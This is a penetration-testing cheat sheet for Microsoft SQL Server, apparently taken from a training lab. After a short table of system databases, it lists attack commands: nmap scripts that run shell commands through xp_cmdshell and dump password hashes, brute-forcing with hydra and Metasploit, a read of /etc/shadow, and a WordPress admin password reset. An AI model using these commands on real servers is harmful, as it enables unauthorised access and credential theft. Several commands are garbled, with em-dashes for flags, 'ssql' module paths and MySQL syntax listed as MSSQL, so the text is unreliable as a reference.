# **MSSSQL**

#### MSSQL Databases

MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:

| Database | Description |
|----------|-------------|
| `master` | Tracks all system information for an SQL server instance. |
| `model` | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database. |
| `msdb` | Used by the SQL Server Agent to schedule jobs and alerts. |
| `tempdb` | Stores temporary objects. |
| `resource` | Read-only database containing system objects included with SQL Server. |


--------------------------------------------------------------------
# Footprinting
### Nmap Scripts
```shell-session
$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
```shell-session
nmap 0.0.0.0 -p 1433 —script ms-sql-info

nmap 0.0.0.0 -p 1433 —script ms-sql-info —script-args mssql-instance-port=1433

nmap 0.0.0.0 -p 1433 —script ms-sql-brute —script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt

nmap 0.0.0.0 -p 1433 —script ms-sql-empty-password

nmap 0.0.0.0 -p 1433 —script ms-sql-query —script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query=”SELECT * FROM master..syslogins” -oN output.txt”

nmap 0.0.0.0 -p 1433 —script ms-sql-dump-hashes —script-args mssql.username=admin,mssql.password=anamaria

nmap 0.0.0.0 -p 1433 —script ms-sql-xp-cmdshell —script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=”ipconfig”
```

--------------------------------------------------------------------
### BRUTEFORCE

```
$ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 0.0.0.0 mssql
```

--------------------------------------------------------------------
### Useful SQL Commands

```
$ show databases;

$ use books;

$ select * from authors;

$ select load_file(”/etc/shadow”)

$ UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';

http://<TARGET-IP>/8585/wordpress/wp-admin
```

--------------------------------------------------------------------
#### Connecting with Mssqlclient.py

If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```shell-session
$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

--------------------------------------------------------------------
### Metasploit Modules
We can also use Metasploit to run an auxiliary scanner called `mssql_ping` that will scan the MSSQL service and provide helpful information in our footprinting process.
```shell-session
> auxiliary(scanner/mssql/mssql_ping)
```

```
- use auxiliary/scanner/mssql/mssql_login
> set user_file /root/Desktop/wordlist/common_users.txt
> set pass_file…

- use auxiliary/admin/ssql/ssql_enum

- use auxiliary/admin/ssql/ssql_enum_ssql_logins

- use auxiliary/admin/ssql/ssql_exec

- use auxiliary/admin/ssql/ssql_enum_domain_accounts
```



